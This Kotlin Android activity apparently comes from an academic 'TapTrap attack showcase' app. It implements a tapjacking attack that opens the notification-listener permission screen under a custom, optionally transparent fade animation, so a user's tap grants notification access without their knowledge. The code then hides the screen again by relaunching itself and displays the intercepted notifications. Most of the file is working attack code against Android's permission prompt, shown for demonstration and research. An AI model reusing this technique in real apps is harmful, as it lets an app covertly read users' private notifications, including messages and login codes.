package edu.hm.itsec.taptrapattackshowcase.notificationservice

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityOptionsCompat
import androidx.lifecycle.lifecycleScope
import edu.hm.itsec.taptrapattackshowcase.R
import edu.hm.itsec.taptrapattackshowcase.databinding.ActivityNotificationServiceAttackBinding
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class NotificationServiceAttackActivity : AppCompatActivity() {

    private val TAG = "NotificationServiceAttackActivity"

    private lateinit var binding: ActivityNotificationServiceAttackBinding

    private var transparencyDeactivated = false

    private var granted: Boolean = false

    private var resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            granted = true
        }
    }

    private val settingsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)

            // check if permission is granted
            if (notificationListenerServicePermissionGranted(applicationContext)) {
                // bring app to front
                val intent = Intent(this@NotificationServiceAttackActivity, NotificationServiceAttackActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                val options = ActivityOptionsCompat.makeCustomAnimation(
                    this@NotificationServiceAttackActivity,
                    R.anim.fade_out,
                    R.anim.fade_out
                )
                startActivity(intent, options.toBundle())
                // stop observing to avoid repeated triggers
                contentResolver.unregisterContentObserver(this)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        binding = ActivityNotificationServiceAttackBinding.inflate(layoutInflater)
        val view = binding.root
        setContentView(view)
        transparencyDeactivated = intent.getBooleanExtra("transparencyDeactivated", false)
        // start attack or listen to notifications if permission is already granted
        if (notificationListenerServicePermissionGranted(applicationContext)) {
            NotificationBus.setConnected(true)
        } else {
            // assumption: the user presses on the button after 3 seconds -> imitating the first tap that cannot be tracked
            lifecycleScope.launch {
                delay(3000)
                binding.activateNotificationListenerSwitch.isChecked = true
            }
            view.post {
                startAttack()
            }
            binding.activateNotificationListenerSwitch.setOnCheckedChangeListener { _, _ ->
                binding.confirm.isEnabled = true
            }
        }
        // watch for connection status
        lifecycleScope.launch {
            NotificationBus.isConnected.collect { isConnected ->
                if (isConnected) granted()
            }
        }

        // watch for incoming notifications
        lifecycleScope.launch {
            NotificationBus.notifications.collect { sbn ->
                // extract notification data
                val title = sbn.notification.extras.getString("android.title")
                val text = sbn.notification.extras.getString("android.text")
                val appName = sbn.packageName

                // update UI
                binding.notificationAppName.text = appName
                binding.notificationTitle.text = title
                binding.notificationText.text =  text
            }
        }
    }

    private fun granted() {
        granted = true
        binding.activateNotificationListenerSwitch.isChecked = true
        binding.confirm.visibility = View.GONE
        binding.notifSwitchLayout.visibility = View.GONE
        binding.notificationInterceptingDesc.visibility = View.VISIBLE
        binding.notificationSettingsPageTitle.text =
            getString(R.string.receiving_notifications)
    }

    private fun startAttack() {
        // cancel attack if permission has already been granted
        if (notificationListenerServicePermissionGranted(applicationContext)) return

        Log.d(TAG, "Starting attack...")

        val componentName = ComponentName(
            applicationContext,
            NotificationListenerService::class.java
        )

        // Creates an Intent to open the notification listener service permission request screen
        val intent = Intent("android.settings.NOTIFICATION_LISTENER_DETAIL_SETTINGS").apply {
            putExtra("android.provider.extra.NOTIFICATION_LISTENER_COMPONENT_NAME", componentName.flattenToString())
        }

        // Creates the custom animation for the activity transition
        val fadeInAnimation = if (transparencyDeactivated) R.anim.fade_in_settings_notifications_transparent else R.anim.fade_in_settings_notifications
        val activityOptions =
            ActivityOptionsCompat.makeCustomAnimation(this, fadeInAnimation, R.anim.fade_out)

        contentResolver.registerContentObserver(
            Settings.Secure.getUriFor("enabled_notification_listeners"),
            true,
            settingsObserver
        )

        // Starts the notification listener service permission request screen with the animation
        resultLauncher.launch(intent, activityOptions)

        // relaunch the NotificationServiceAttackActivity to hide the permission request screen after 6 seconds
        object : CountDownTimer(6000, 1000) {
            override fun onTick(millisUntilFinished: Long) {}

            override fun onFinish() {
                val notificationServiceAttackIntent = Intent(
                    this@NotificationServiceAttackActivity,
                    NotificationServiceAttackActivity::class.java
                ).apply {
                    putExtra("transparencyDeactivated", transparencyDeactivated)
                }
                if (!granted) {
                    val toast = Toast(applicationContext)
                    toast.setText("Restarting attack...")
                    toast.show()
                    startActivity(notificationServiceAttackIntent)
                }
            }
        }.start()
    }

    private fun notificationListenerServicePermissionGranted(context: Context): Boolean {
        val cn = ComponentName(context, NotificationListenerService::class.java)
        val enabledListeners = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        ) ?: return false

        return enabledListeners.contains(cn.flattenToString())
    }
}